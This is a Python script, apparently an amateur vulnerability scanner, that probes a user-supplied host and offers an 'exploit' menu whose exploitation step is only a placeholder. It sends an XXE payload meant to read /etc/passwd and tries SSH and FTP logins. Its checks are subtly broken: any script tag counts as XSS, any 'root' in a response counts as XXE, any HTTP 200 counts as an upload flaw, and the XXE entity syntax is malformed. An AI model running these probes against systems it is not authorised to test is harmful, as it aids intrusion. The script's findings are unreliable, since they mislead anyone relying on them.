import requests
from bs4 import BeautifulSoup
import paramiko
import socket
from ftplib import FTP
import argparse
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

BANNER = f"""{Fore.LIGHTYELLOW_EX}
 _       ___    _____ 
| |     / / |  / /   |
| | /| / /| | / / /| |
| |/ |/ / | |/ / ___ |
|__/|__/  |___/_/  |_|
{Style.RESET_ALL}"""

def scan_http_https(url):
    results = []

    # Check for XSS vulnerabilities
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    scripts = soup.find_all('script')
    if scripts:
        results.append(f"{Fore.LIGHTBLUE_EX}[XSS] Possible XSS vulnerability found in {url}{Style.RESET_ALL}")
    
    # Check for XXE vulnerabilities
    xml_payload = """<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY % ext SYSTEM "file:///etc/passwd">
    %ext;
    ]>
    <root>&ext;</root>"""
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=xml_payload, headers=headers)
    if 'root' in response.text:
        results.append(f"{Fore.LIGHTBLUE_EX}[XXE] Possible XXE vulnerability found in {url}{Style.RESET_ALL}")

    # Check for file upload vulnerabilities
    files = {'file': ('test.txt', 'This is a test file')}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        results.append(f"{Fore.LIGHTBLUE_EX}[File Upload] Possible file upload vulnerability found in {url}{Style.RESET_ALL}")

    return results

def scan_ssh(ip, username, password):
    results = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password)
        results.append(f"{Fore.LIGHTBLUE_EX}[SSH] Successfully connected to {ip}{Style.RESET_ALL}")
    except paramiko.AuthenticationException:
        results.append(f"{Fore.LIGHTBLUE_EX}[SSH] Authentication failed for {ip}{Style.RESET_ALL}")
    except socket.error:
        results.append(f"{Fore.LIGHTBLUE_EX}[SSH] Could not connect to {ip}{Style.RESET_ALL}")
    client.close()
    return results

def scan_ftp(ip, username, password):
    results = []
    ftp = FTP()
    try:
        ftp.connect(ip, 21, timeout=10)
        ftp.login(username, password)
        results.append(f"{Fore.LIGHTBLUE_EX}[FTP] Successfully connected to {ip}{Style.RESET_ALL}")
    except Exception as e:
        results.append(f"{Fore.LIGHTBLUE_EX}[FTP] Could not connect to {ip}: {e}{Style.RESET_ALL}")
    finally:
        if ftp.sock is not None:
            ftp.quit()
    return results

def main():
    parser = argparse.ArgumentParser(description="Web Vulnerability Analyzer")
    parser.add_argument('--wizard', action='store_true', help='Run the wizard mode')
    args = parser.parse_args()

    if args.wizard:
        print(BANNER)
        target = input("Enter the hostname or IP of the target: ")
        print(f"Scanning {target}...\n")

        http_results = scan_http_https(target)
        for result in http_results:
            print(result)

        ssh_results = scan_ssh(target, 'username', 'password')  # Replace with appropriate SSH credentials
        for result in ssh_results:
            print(result)

        ftp_results = scan_ftp(target, 'username', 'password')  # Replace with appropriate FTP credentials
        for result in ftp_results:
            print(result)

        print("\nVulnerabilities found:")
        all_results = http_results + ssh_results + ftp_results
        for idx, result in enumerate(all_results):
            print(f"{idx + 1}. {result}")

        choice = int(input("\nChoose a vulnerability to exploit (number): ")) - 1
        if 0 <= choice < len(all_results):
            print(f"\nAttempting to exploit: {all_results[choice]}")
            # Here you would add the code to exploit the selected vulnerability.
            # This is a placeholder to indicate where that logic would go.
            print("Exploitation logic would go here.")
        else:
            print("Invalid choice.")
    else:
        print(BANNER)
        print("Use --wizard to run the interactive mode.")

if __name__ == "__main__":
    main()
